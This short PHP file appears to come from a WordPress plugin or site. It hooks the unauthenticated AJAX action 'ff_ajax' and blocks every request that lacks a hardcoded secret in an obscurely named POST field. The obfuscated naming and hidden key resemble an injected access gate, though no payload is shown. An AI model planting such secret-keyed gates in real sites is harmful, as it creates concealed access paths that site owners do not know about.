<?php

function feeds_authors_validator_advance() {
	if (!isset($_POST["txjxkhijm"]) || $_POST["txjxkhijm"] !== "ieCzHvjhoYE6") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'feeds_authors_validator_advance', 5, 1);
